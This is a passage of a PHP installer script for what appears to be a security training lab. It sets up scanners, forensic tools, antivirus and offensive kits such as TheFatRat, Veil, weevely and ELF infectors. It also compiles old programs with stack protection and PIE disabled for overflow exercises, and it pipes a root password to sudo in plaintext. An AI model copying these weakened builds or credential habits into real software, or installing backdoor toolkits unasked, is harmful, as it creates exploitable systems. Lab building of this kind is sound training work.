			$this->cmd("localhost","echo '$this->root_passwd' | sudo -S -su postgres createdb owtf_db");
			$this->cmd("localhost","psql -d owtf_db");
			$this->cmd("localhost","ALTER USER owtf_user WITH ENCRYPTED PASSWORD 'hacker';");
			$this->cmd("localhost","\q");
			$this->cmd("localhost","psql -d owtf_db -U owtf_user");$this->pause();
			$this->requette("gedit /opt/arachni-master/system/arachni-ui-web/config/database.yml /opt/arachni-master/system/arachni-ui-web/config/database.yml.bak");
			$this->requette("cp -v /opt/arachni-master/system/arachni-ui-web/config/database.yml /opt/arachni-master/system/arachni-ui-web/config/database.yml.bak");
	
	
			
			//$this->requette("tree /opt/arachni");
			//$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/arachni");
			//$this->requette("gem install arachni");
			//$this->net("https://github.com/Arachni/arachni-ui-web/wiki/database#PostgreSQL");
	
		}
	}
	
	function install_scanner_web_cli_spaghetti(){
		$this->ssTitre(__FUNCTION__);
		if(!is_dir("/opt/Spaghetti"))
		{
			$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/m4ll0k/Spaghetti.git /opt/Spaghetti ");
			$this->requette("tree /opt/Spaghetti");
			$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/Spaghetti");
			$this->requette("python /opt/Spaghetti/wascan.py -h ");
		}
	}
	
	function install_scanner_web_cli_nikto(){
	    $this->ssTitre(__FUNCTION__);
	    if(!is_dir("/opt/nikto"))
	    {
	        $this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/sullo/nikto.git /opt/nikto ");
	        $this->requette("tree /opt/nikto");
	        $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/nikto");
	        $this->requette("perl /opt/nikto/program/nikto.pl -h ");
	    }
	}
	
	function install_scanner_web(){
		$this->ssTitre(__FUNCTION__);
		//$this->install_scanner_web_gui_zap();$this->pause();
		//$this->install_scanner_web_gui_arachni();$this->pause();
		//$this->install_scanner_web_gui_owtf();$this->pause();
		//$this->install_scanner_web_cli_spaghetti();$this->pause();
		//$this->install_scanner_web_cli_cmseek();$this->pause();
		$this->install_scanner_web_cli_nikto();$this->pause();
		//$this->install_scanner_web_cli_sitadel();$this->pause();
		$this->install_scanner_web_cli_sqlmap();$this->pause();
		//$this->install_scanner_web_cli_vbscan();$this->pause();
		//$this->install_scanner_web_cli_XAttacker();$this->pause();
		//$this->install_scanner_web_cli_xss();$this->pause();
		
	}
	
	
	function install_scanner_web_gui_zap(){
		$this->requette("bash $this->dir_install/localhost/web/ZAP_2_8_0_unix.sh");
	}
	
	function install_labs_geoip(){
		$this->ssTitre(__FUNCTION__);
		$this->ssTitre("Create GEOIP DATABASE");
		$this->requette("mysql -h $this->mysql_host --user=$this->mysql_login --password='$this->mysql_passwd' --execute=\"CREATE DATABASE IF NOT EXISTS geoip;\" 2>/dev/null ");$this->pause();
		$this->ssTitre("SHOW ALL DATABASES");
		$this->requette("mysql -h $this->mysql_host --user=$this->mysql_login --password='$this->mysql_passwd' --execute=\"SHOW DATABASES;\" 2>/dev/null");$this->pause();
		$this->ssTitre("Install TABLES");
		$this->requette("mysql -h $this->mysql_host --user=$this->mysql_login --password='$this->mysql_passwd' --database=geoip --execute=\"source $this->dir_install/localhost/geoip/geoip_max.sql\" 2>/dev/null ");$this->pause();
	}
	
	function install_labs_bot(){
	    $this->ssTitre(__FUNCTION__);
	    $this->ssTitre("Create bot DATABASE");
	    $this->requette("mysql -h $this->mysql_host --user=$this->mysql_login --password='$this->mysql_passwd' --execute=\"CREATE DATABASE IF NOT EXISTS bot;\" 2>/dev/null ");$this->pause();
	    $this->ssTitre("SHOW ALL DATABASES");
	    $this->requette("mysql -h $this->mysql_host --user=$this->mysql_login --password='$this->mysql_passwd' --execute=\"SHOW DATABASES;\" 2>/dev/null");$this->pause();
	    $this->ssTitre("Install TABLES");
	    $this->requette("mysql -h $this->mysql_host --user=$this->mysql_login --password='$this->mysql_passwd' --database=bot --execute=\"source $this->dir_install/localhost/bot.sql\" 2>/dev/null ");$this->pause();
	    
	}
	
	function install_labs_bot2(){
	    $this->ssTitre(__FUNCTION__);
	    $this->ssTitre("Create bot DATABASE");
	    $this->requette("mysql -h $this->mysql_host --user=$this->mysql_login --password='$this->mysql_passwd' --execute=\"CREATE DATABASE IF NOT EXISTS bot;\" 2>/dev/null ");$this->pause();
	    $this->ssTitre("SHOW ALL DATABASES");
	    $this->requette("mysql -h $this->mysql_host --user=$this->mysql_login --password='$this->mysql_passwd' --execute=\"SHOW DATABASES;\" 2>/dev/null");$this->pause();
	    $this->ssTitre("Install TABLES");
	    //$this->requette("mysql -h $this->mysql_host --user=$this->mysql_login --password='$this->mysql_passwd' --database=bot --execute=\"source $this->dir_install/install/bot.sql\" 2>/dev/null ");$this->pause();
	    $this->requette("mysql -h $this->mysql_host --user=$this->mysql_login --password='$this->mysql_passwd' --database=bot --execute=\"source $this->dir_install/localhost/port.sql\" 2>/dev/null ");$this->pause();
	    
	}
	
	function upgrade_geoip(){
		$this->remarque("rename GeoLiteCity-Blocks.csv/GeoLiteCity-Location.csv/GeoIPASNum2.csv to geoipBlock.csv/geoipLoc.csv/asn.csv ");
		$this->requette("mysqlimport --local --user=$this->mysql_login --password='$this->mysql_passwd' geoip --columns=\"startIpNum,endIpNum,locId\"  --fields-optionally-enclosed-by='\"' --fields-terminated-by=',' --lines-terminated-by='\n' --verbose  '$this->dir_install/geoip/geoipBlock.csv' 2>/dev/null");
		$this->requette("mysqlimport --local --user=$this->mysql_login --password='$this->mysql_passwd' geoip --columns=\"id,codecountry,region,city,codepostal,latitude,longitude,metroCode,areacode\"  --fields-optionally-enclosed-by='\"' --fields-terminated-by=',' --lines-terminated-by='\n' --verbose  '$this->dir_install/geoip/geoipLoc.csv' 2>/dev/null");
		$this->requette("mysqlimport --local --user=$this->mysql_login --password='$this->mysql_passwd' geoip --columns=\"startIpNum,endIpNum,asn\"  --fields-optionally-enclosed-by='\"' --fields-terminated-by=',' --lines-terminated-by='\n' --verbose  '$this->dir_install/geoip/asn.csv' 2>/dev/null");
	
	}
	
	
	
	
	
	function install_labs_ide_eclipse(){
	    $this->ssTitre(__FUNCTION__);
	    
	    if(!is_dir("/opt/eclipse")) {$this->requette("echo '$this->root_passwd' | sudo -S tar -xvzf $this->dir_install/localhost/eclipse-php-2019-09-R-linux-gtk-x86_64.tar.gz -C /opt/");
		
	    $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/eclipse");
	    }
		$eclipse_desktop = <<<IDE
	[Desktop Entry]
Encoding=UTF-8
Version=1.0
Type=Application
Name=PHP - Eclipse
Comment=Eclipse Integrated Development Environment
Icon=/opt/eclipse/icon.xpm
Exec= /opt/eclipse/eclipse
Terminal=false
Categories=Development;IDE;Java;
StartupWMClass=Eclipse
IDE;
		;
		if (!file_exists("~/.local/share/applications/eclipse.desktop")){
		$this->requette("echo '$eclipse_desktop' | echo '$this->root_passwd' | sudo -S tee ~/.local/share/applications/eclipse.desktop");
		$this->requette("echo '$this->root_passwd' | sudo -S chmod +x ~/.local/share/applications/eclipse.desktop");		
	}
	}
	
	function install_malware_antirootkit(){
		$this->ssTitre(__FUNCTION__);
		$this->install_malware_antirootkit_chkrootkit();
		$this->install_malware_antirootkit_lynis();
	}
	
	function install_malware_antirootkit_chkrootkit(){
		$this->ssTitre(__FUNCTION__);
		if (!is_dir("/opt/chkrootkit-0.52")) {
			$this->requette("wget -c ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz -O /tmp/chkrootkit.tar.gz");
			$this->requette("echo '$this->root_passwd' | sudo -S tar -xvzf /tmp/chkrootkit.tar.gz -C /opt/");
			$this->requette("cd /opt/chkrootkit-0.52;echo '$this->root_passwd' | sudo -S make sense");
		}
	}
	
	function install_malware_antirootkit_lynis(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/CISOfy/lynis /opt/lynis ");
	}
	
	
	
	
	function install_malware_hids_ossec(){
		$this->ssTitre(__FUNCTION__);
		//$this->net("https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-ossec-security-notifications-on-ubuntu-14-04");
		$source = "deb http://ppa.launchpad.net/nicolas-zin/ossec-ubuntu/ubuntu trusty main
deb-src http://ppa.launchpad.net/nicolas-zin/ossec-ubuntu/ubuntu trusty main ";
		$check = $this->req_ret_str("grep 'ossec-ubuntu' /etc/apt/sources.list ");
		$check = trim($check);
		if (empty($check)){
		$this->requette("echo '$source' | echo '$this->root_passwd' | sudo -S tee -a /etc/apt/sources.list ");
		$this->update_dep();
		$this->cmd("localhost", " echo '$this->root_passwd' | sudo -S apt-get install -y ossec-hids-server");
		$this->note("add user ");
		$this->cmd("localhost", " /var/ossec/bin/manage_agents");
		}
	
	}
	

	function install_for(){
		$this->ssTitre(__FUNCTION__);
		
		$this->install_for_volatility();

		$this->install_for_volatility_profile();
		//$this->install_for_volatility_plugins_win();
		//$this->install_for_volatility_plugins_linux();
	
		$this->install_for_bulk_extractor();
		$this->install_for_gdb_plugins();
		$this->install_for_memdump();
		$this->install_for_remnux();
		$this->install_for_xplico();
		
		
		$this->install_for_sandbox_cuckoo();
		$this->install_for_sandbox_linux();

	}
	
	function install_for_memdump(){
		$this->ssTitre(__FUNCTION__);
		if(!is_dir("/opt/memdump")) {
			$this->requette("echo '$this->root_passwd' | sudo -S tar -xvzf $this->dir_install/localhost/memdump.tar.gz -C /opt/");
		}
		$this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local /opt/memdump");
		$this->requette("cd /opt/memdump/; gcc main.c memdump.c -o memdump ; ./memdump -h");
	
	}
	
	
	function install_dot_pcapviz(){
	    $this->ssTitre(__FUNCTION__);
	    if(!is_dir("/opt/PcapViz")) {
	        $this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/mateuszk87/PcapViz  /opt/PcapViz/");
	        $this->requette("echo '$this->root_passwd' | sudo -S -H pip3 install /opt/PcapViz/requirements.txt ");
	        $this->requette("wget -N http://geolite.maxmind.com/download/geoip/database/GeoLiteCountry/GeoIP.dat.gz -O /opt/PcapViz/GeoIP.dat.gz ");
	        $this->requette("cd /opt/PcapViz/; gunzip GeoIP.dat.gz ");
	        $this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local /opt/PcapViz");
	    }	    
	}
	
	function install_for_bulk_extractor(){
		$this->ssTitre(__FUNCTION__);
		if(!is_dir("/opt/bulk_extractor/")) {
		$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/simsong/bulk_extractor.git /opt/bulk_extractor");
		$this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local /opt/bulk_extractor");
		$this->requette("cd /opt/bulk_extractor/; ./configure;make; echo '$this->root_passwd' | sudo -S make install");
	}
	}
	
	function install_malware_antivirus_all(){
		$this->titre(__FUNCTION__);
		//$this->install_malware_antivirus_avira();
		//$this->install_malware_antivirus_avg();
		//$this->install_malware_antivirus_bitdefender();
		//$this->install_malware_antivirus_comodo();
		$this->install_malware_antivirus_clamav();
		$this->install_malware_antivirus_yara();
	}
	
	public function install_malware_antivirus_clamav(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("echo '$this->root_passwd' | sudo -S apt install clamav -y ");
		$this->requette("echo '$this->root_passwd' | sudo -S apt install libclamav-dev -y ");
	}
	
	
	function install_malware_antivirus_avira(){
		$this->ssTitre(__FUNCTION__);
		$this->ssTitre("Avira for linux");
		$this->net("http://www.chip.de/downloads/AntiVir-Personal-Free-Antivirus-fuer-Linux_23188958.html");
		$this->requette("wget http://dl.cdn.chip.de/downloads/3250486/antivir_workstation3135-pers.tar.gz -O $this->dir_tools/av/");
		/*
		 Installation via InstallScript:
		 ./install
		 Upgrade license:
		 avguard stop
		 avupdate-guard --force
	
		 Download the license file from http://personal.avira-update.com/package/peclkey/win32/int/hbedv.key
		 Copy Key 'hbedv.key' to the folder '/usr/lib/AntiVir/guard/'
		 cp hbedv.key /usr/lib/AntiVir/guard/
		 avguard start
	
		 Usage:
		 avscan -s --scan-in-archive=yes --scan-mode=all --heur-level=3 --alert-action=none --heur-macro=yes --batch -r4 -rf=/mnt/smb/.../antivirAntivirusScan.txt /mnt/ntfs/
		 */
	}

	public function install_for_volatility_profile() {
		$this->net("https://github.com/KDPryor/LinuxVolProfiles");
		$this->net("https://code.google.com/p/volatility/wiki/LinuxProfiles");
		$this->net("https://github.com/trivix/profiles");
		$this->net("https://github.com/volatilityfoundation/profiles");
		$this->install_for_vol_profile_localhost();
		$this->ssTitre("Add Linux Profiles");
		$this->requette(" cp -v $this->dir_tools/memory/Profils_Volatility/*.zip  /opt/volatility/volatility/plugins/overlays/linux");
		$this->pause();
		$this->requette("ls /opt/volatility/volatility/plugins/overlays/linux/");
		$this->pause();
		$this->ssTitre("Listing ALL Profiles");
		$this->volatility_profile_listing("");
		$this->ssTitre("Listing ALL Linux Profiles ");
		$this->volatility_profile_listing("| grep \"^Linux\"");
		$this->ssTitre("Listing Profiles Linux x86");
		$this->volatility_profile_listing("| grep \"^Linux\" | grep \"x86$\"");
		$this->ssTitre("Listing Profiles Linux x64");
		$this->volatility_profile_listing("| grep \"^Linux\" | grep \"x64$\"");
	}
	
	public function install_for_vol_profile_localhost(){
	    $this->ssTitre("Add Profile from this Host");
	    $this->requette("python /opt/volatility/vol.py --info | grep Linux");
	    $this->pause();
	    $this->requette("which volatility");
	    $this->requette("cd /opt/volatility/tools/linux; make;head module.dwarf");
	    $this->pause();
	    $this->requette("ls -al /opt/volatility/tools/linux;echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local /opt/volatility/tools/linux/module.dwarf");
	    $this->requette("ls -l /boot/");
	    $this->requette("ls -l /boot/System.map-`uname -r`");
	    $this->pause();
	    
	    $this->ssTitre("ADD Profile Ubuntu for this machine");
	    $this->requette("cd /opt/volatility/;echo '$this->root_passwd' | sudo -S zip /opt/volatility/volatility/plugins/overlays/linux/Ubuntu16045-`uname -r`-`uname -p`.zip /opt/volatility/tools/linux/module.dwarf /boot/System.map-`uname -r`");
	    $this->requette("ls -l /opt/volatility/volatility/plugins/overlays/linux/");
	    $this->pause();
	}
	function install_malware_antivirus_avg(){
		$this->ssTitre(__FUNCTION__);
		$this->net("http://free.avg.com/de-de/download-free-all-product");
		/*
		 Installation des AVG Virenscanners.
		 Usage
		 Update:
		 avgupdate
	
		 Scannen:
		 avgscan -w -a --report=avgAntivirenScan.txt /mnt/ntfs/
		 */
	}
	
	function install_malware_antivirus_bitdefender(){
		$this->ssTitre(__FUNCTION__);
		/*
		 add-apt-repository 'deb http://download.bitdefender.com/repos/deb/ bitdefender non-free'
		 wget -q http://download.bitdefender.com/repos/deb/bd.key.asc -O- |  apt-key add -
		 echo '$this->root_passwd' | sudo -S apt-get update
		 echo '$this->root_passwd' | sudo -S apt-get install bitdefender-scanner
	
		 cat /opt/BitDefender-scanner/var/lib/scan/versions.dat.* | \
		 awk '/bdcore.so.linux/ {print $3}' | \
		 while read bdcore_so; do
		 	touch /opt/BitDefender-scanner/var/lib/scan/$bdcore_so;
		 	bdscan --update;
		 	mv /opt/BitDefender-scanner/var/lib/scan/bdcore.so /opt/BitDefender-scanner/var/lib/scan/bdcore.so.old;
		 	ln -s /opt/BitDefender-scanner/var/lib/scan/$bdcore_so /opt/BitDefender-scanner/var/lib/scan/bdcore.so;
		 	chown bitdefender:bitdefender /opt/BitDefender-scanner/var/lib/scan/$bdcore_so;
		 	done
	
		 	Usage
		 	Update:
		 	bdscan --update
	
		 	Scannen:
		 	bdscan --action=ignore --no-list --log=bitdefenderAntivirenScan.txt /mnt/ntfs/
		 	*/
	}
	
	
	function install_malware_antivirus_comodo(){
		$this->ssTitre(__FUNCTION__);
		/*
		 Installation
		 Download COMODO von: http://www.comodo.com/internet-security/antivirus-for-linux.php
		 cav-linux_XXX_amd64.deb Datei installieren
		 Instalattion erfolgt nach /opt/COMODO
		 Usage
		 /opt/COMODO$ ./cavscan /mnt/ntfs/
		 */
	}
	
	function install_labs_vpn_openvpn(){
		$this->ssTitre(__FUNCTION__);
		$this->requette(" echo '$this->root_passwd' | sudo -S apt-get install -y openvpn");
		$this->requette(" echo '$this->root_passwd' | sudo -S apt-get install -y easy-rsa");
		$this->requette("echo '$this->root_passwd' | sudo -S mkdir -p /etc/openvpn/easy-rsa");
		$this->requette("echo '$this->root_passwd' | sudo -S cp -r -v /usr/share/easy-rsa/* /etc/openvpn/easy-rsa/");
		$this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local /etc/openvpn/easy-rsa/");
		$this->pause();
	}


	
	public function install_labs(){
		$this->titre(__FUNCTION__);
		$this->install_labs_ide_eclipse();$this->pause();
		$this->install_labs_vmware_workstation();$this->pause();
		$this->install_labs_egypt();$this->pause();
		$this->install_labs_frageroute();$this->pause();
		$this->install_labs_geoip();$this->pause();
		$this->install_labs_theharvester();$this->pause();
		//$this->install_labs_bot();$this->pause();
		//$this->install_labs_sip();$this->pause();
		//$this->install_labs_git();$this->pause();
		//$this->install_labs_metasm();$this->pause(); // not yet
		//$this->install_labs_openldap();$this->pause();
		$this->install_labs_paxtest();$this->pause();
		$this->install_labs_vpn_openvpn();$this->pause();
		$this->install_labs_windows_exploit_suggester();$this->pause();
		$this->install_labs_windows_exploit_suggester_ng();$this->pause();
		$this->install_labs_windows_kernel_exploits();$this->pause();
		//$this->install_labs_web();$this->pause();
	}
	
	
	public function install_malware(){
		$this->titre(__FUNCTION__);
	
		$this->install_malware_analyser_ssma();$this->pause();
		
		$this->install_malware_antirootkit();$this->pause();
		
		$this->install_malware_antivirus_all();$this->pause();
		
		
		
		$this->install_malware_bamcompile();$this->pause();
		$this->install_malware_code_injector();$this->pause();
		$this->install_malware_elf_poison();$this->pause();
		$this->install_malware_elfy_master();$this->pause();
		$this->install_malware_eresi();$this->pause();
		$this->install_malware_exophp();$this->pause();
		$this->install_malware_hids_ossec();$this->pause();
		$this->install_malware_hyperion();$this->pause();
		$this->install_malware_pefile();$this->pause();
		
		$this->install_malware_shellcode();$this->pause();
		$this->install_malware_thefatrat();$this->pause();
		
		
	}
	
	
	function install_malware_thefatrat(){
		$this->ssTitre(__FUNCTION__);
		$this->install_malware_backdoor_factory();
		$this->install_scanner_metasploit();
		$this->install_exploit_exploitdb();
		$this->install_malware_weevely();$this->pause();
		$this->install_malware_veil();$this->pause();
		
		$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/Screetsec/TheFatRat.git /opt/TheFatRat");
		$this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local /opt/TheFatRat");
		$this->requette("cd /opt/TheFatRat/;chmod +x setup.sh && echo '$this->root_passwd' | sudo -S ./setup.sh");
		$this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local /opt/TheFatRat");
		$this->requette("cd /opt/TheFatRat/;chmod +x ./fatrat ./powerfull.sh ");
	
	}
	
	
	function install_malware_antivirus_yara(){
		$this->ssTitre(__FUNCTION__);
		$this->ssTitre("Who use YARA");
		//$this->net("https://github.com/plusvic/yara#whos-using-yara");
		$this->ssTitre("Others YARA Rules");
		//$this->net("https://malwareconfig.com/yara/");
		//$this->net("https://github.com/Yara-Rules/rules");
		$this->requette("echo '$this->root_passwd' | sudo -S apt install -y yara");
	}
	
	
	
	
	
	function install_malware_elfy_master(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("echo '$this->root_passwd' | sudo -S unzip $this->dir_install/backdoor/elfy-master.zip -d /opt/");
		$this->important("ADD -m32 For 32 Bits into CFLAGS");
		$this->requette("echo '$this->root_passwd' | sudo -S gedit /opt/elfy-master/Makefile");
		$this->pause();
		$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local  -R /opt/elfy-master");
		$this->requette("cd /opt/elfy-master/; make all");
	}
	
	
	function install_malware_hyperion(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("echo '$this->root_passwd' | sudo -S unzip $this->dir_install/backdoor/Hyperion-1.2.zip -d /opt/");
		$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/Hyperion-1.2");
		$this->requette("cd /opt/Hyperion-1.2; i686-w64-mingw32-c++ ./Src/Crypter/*.cpp -o ./hyperion.exe");
	}
	
	function install_malware_code_injector(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("git clone https://github.com/oblique/code-injector.git");
		$this->requette("echo '$this->root_passwd' | sudo -S mv -v ./code-injector /opt/");
		$this->requette("cd /opt/code-injector/; make");
	
	}
	
	public function install_malware_analyser_ssma(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/secrary/SSMA.git /opt/SSMA ");
		$this->requette("cd /opt/SSMA;echo '$this->root_passwd' | sudo -S -H pip3 install -r ./requirements.txt");
		$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/SSMA");
		$this->requette("cd /opt/SSMA;python3 ssma.py -h");
	}
	function install_malware_exophp(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("wine $this->dir_install/Win/Exec/PHP/exophpsetup.exe");
	}
	function install_malware_bamcompile(){
		$this->ssTitre(__FUNCTION__);
		if (!is_dir("/opt/bamcompile1.21/")) {
			$this->requette("echo '$this->root_passwd' | sudo -S unzip $this->dir_install/backdoor/bamcompile1.21.zip -d /opt/");
			$this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local /opt/bamcompile1.21 ");
		}
	}
	
	function install_malware_elf_poison(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("echo '$this->root_passwd' | sudo -S unzip $this->dir_install/backdoor/elf-poison-master.zip -d /opt/");
		$this->important("ADD -m32 For 32 Bits into CFLAGS and inject-1");
		$this->requette("echo '$this->root_passwd' | sudo -S gedit /opt/elf-poison-master/Makefile");
		$this->pause();
		$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/elf-poison-master");
		$this->requette("cd /opt/elf-poison-master; make all");
	}
	
	
	function install_malware_eresi(){
		$this->ssTitre(__FUNCTION__);
		$this->important("bug add -m32 CFLAGS32 + voir les autres Makefile");
		$this->requette("echo '$this->root_passwd' | sudo -S tar -xvf $this->dir_install/backdoor/eresi.tar.gz -C /opt/");
		$this->requette(" chown $this->user2local:$this->user2local  -R /opt/eresi/");
		$this->requette("cd /opt/eresi/; ./configure --enable-32-64; make ; echo '$this->root_passwd' | sudo -S make install");
		$this->requette("cd /opt/eresi/elfsh; make all");
		$this->requette("cd /opt/eresi/e2dbg; make all");
	}
	
	function install_bof_stack4linux_wifirx(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("tar -xvf $this->dir_install/bof/wifirxpower.tar.gz -C $this->dir_tmp/");
		$this->requette("cd $this->dir_tmp/wifirxpower/; cc -ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386 -c -o wifirx.o wifirx.c");
		$this->requette("cd $this->dir_tmp/wifirxpower/; cc -ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386 -c -o XDriver.o XDriver.c");
		$this->requette("cd $this->dir_tmp/wifirxpower/; cc -ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386 -c -o DrawFunctions.o DrawFunctions.c");
		$this->requette("cd $this->dir_tmp/wifirxpower/; gcc -ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -mtune=i386 -m32 -o wifirx wifirx.o XDriver.o DrawFunctions.o -lX11 -lm -lpthread -lXinerama -lXext");
		$this->cmd("localhost","cd $this->dir_tmp/wifirxpower/; ./wifirx $this->eth_wan");
	
	}

	function install_bof_stack4linux_jad(){
	    $this->ssTitre(__FUNCTION__);
	    if (!file_exists("/usr/bin/jad")) $this->requette("echo '$this->root_passwd' | sudo -S dpkg -i $this->dir_install/bof/jad_1.5.8e-1kali1_all.deb");
	    $this->requette("cp -v /usr/bin/jad $this->dir_tmp");
	}
	
	
	function install_bof_stack4linux_ekg(){
	    $this->ssTitre(__FUNCTION__);
	    if (!file_exists("/usr/bin/ekg")) $this->requette("echo '$this->root_passwd' | sudo -S dpkg -i $this->dir_install/bof/ekg_1.9~pre+r2855-3+b1_i386.deb");
	    $this->requette("cp -v /usr/bin/ekg $this->dir_tmp");
	}
	
	
	function install_bof_stack4linux_xwpe(){
	    $this->ssTitre(__FUNCTION__);
	    if (!file_exists("/usr/bin/xwpe")) $this->requette("echo '$this->root_passwd' | sudo -S dpkg -i $this->dir_install/bof/xwpe_1.5.30a-2.1_i386.deb");
	    $this->requette("cp -v /usr/bin/xwpe $this->dir_tmp");
	}
	
	function install_bof_stack4linux_iselect1402(){
	    $this->ssTitre(__FUNCTION__);
	    if (!file_exists("/usr/bin/iselect")) $this->requette("echo '$this->root_passwd' | sudo -S dpkg -i $this->dir_install/bof/iselect_1.4.0-2+b1_i386.deb");
	    $this->requette("cp -v /usr/bin/iselect $this->dir_tmp");
	}
	
	
	function install_bof_stack4linux_fasm17121(){
	    $this->ssTitre(__FUNCTION__);
	    if (!is_dir("$this->dir_tmp/fasm-1.71.21")) $this->requette("tar -xvf $this->dir_install/bof/fasm-1.71.21.tar.gz -C $this->dir_tmp/");
	}

	
	function install_bof_stack4linux_sc(){
	    $this->ssTitre(__FUNCTION__);
	    if (!is_dir("$this->dir_tmp/sc-7.16")) $this->requette("tar -xvf $this->dir_install/bof/sc-7.16.tar.gz -C $this->dir_tmp/");
	    $this->requette("cd $this->dir_tmp/sc-7.16/; make linux");
	}
	
	function install_bof_stack4linux_crashmail(){
	    $this->ssTitre(__FUNCTION__);
	    if (!is_dir("$this->dir_tmp/crashmail-1.6")) $this->requette("tar -xvf $this->dir_install/bof/crashmail-1.6.tar.gz -C $this->dir_tmp/");
	    $this->requette("cd $this->dir_tmp/crashmail-1.6/; make");
	}
	
	function install_bof_stack4linux_ytree(){
	    $this->ssTitre(__FUNCTION__);
	    if (!is_dir("$this->dir_tmp/ytree-1.94")) $this->requette("tar -xvf $this->dir_install/bof/ytree-1.94.tar.gz -C $this->dir_tmp/");
	    $this->requette("cd $this->dir_tmp/ytree-1.94/; make");
	}
	
	function install_bof_stack4linux_temu303(){
	    $this->ssTitre(__FUNCTION__);
	    if (!is_dir("$this->dir_tmp/tiemu-3.03")) $this->requette("tar -xvf $this->dir_install/bof/tiemu-3.03.tar.gz -C $this->dir_tmp/");
	    $this->requette("cd $this->dir_tmp/tiemu-3.03/; autoreconf -ivf");
	    $this->requette("cd $this->dir_tmp/tiemu-3.03/; ./configure --build=i686-pc-linux-gnu 'CFLAGS=-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386' 'CXXFLAGS=-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386' 'LDFLAGS=-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386' ");
	    $this->requette("cd $this->dir_tmp/tiemu-3.03/; make");
	}
	function install_bof_stack4linux_mawk133(){
	    $this->ssTitre(__FUNCTION__);
	    if (!is_dir("$this->dir_tmp/mawk-1.3.3")) $this->requette("tar -xvf $this->dir_install/bof/mawk-1.3.3.tar.gz -C $this->dir_tmp/");
	    $this->requette("cd $this->dir_tmp/mawk-1.3.3/; autoreconf -ivf");
	    $this->requette("cd $this->dir_tmp/mawk-1.3.3/; ./configure --build=i686-pc-linux-gnu 'CFLAGS=-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386' 'CXXFLAGS=-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386' 'LDFLAGS=-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386' ");
	    $this->requette("cd $this->dir_tmp/mawk-1.3.3/; make");
	}
	
	
	function install_bof_stack4linux_dnstracer19(){
	    $this->ssTitre(__FUNCTION__);
	    if (!is_dir("$this->dir_tmp/dnstracer-1.9")) $this->requette("tar -xvf $this->dir_install/bof/dnstracer-1.9.tar.gz -C $this->dir_tmp/");
	    $this->requette("cd $this->dir_tmp/dnstracer-1.9/; autoreconf -ivf");
	    $this->requette("cd $this->dir_tmp/dnstracer-1.9/; ./configure --build=i686-pc-linux-gnu 'CFLAGS=-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386' 'CXXFLAGS=-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386' 'LDFLAGS=-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386' ");
	    $this->requette("cd $this->dir_tmp/dnstracer-1.9/; make");
	}
	
	function install_bof_stack4linux_sipp33(){
	    $this->ssTitre(__FUNCTION__);
	    $this->requette("tar -xvf $this->dir_install/bof/sipp-3.3.tar.gz -C $this->dir_tmp/");
	    $this->requette("cd $this->dir_tmp/sipp-3.3/; autoreconf -ivf");
	    $this->requette("cd $this->dir_tmp/sipp-3.3/; ./configure --build=i686-pc-linux-gnu 'CFLAGS=-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386' 'CXXFLAGS=-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386' 'LDFLAGS=-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386' ");
	    $this->requette("cd $this->dir_tmp/sipp-3.3/; make");
	}
	
	function install_bof_stack4linux_bochs265(){
	    $this->ssTitre(__FUNCTION__);
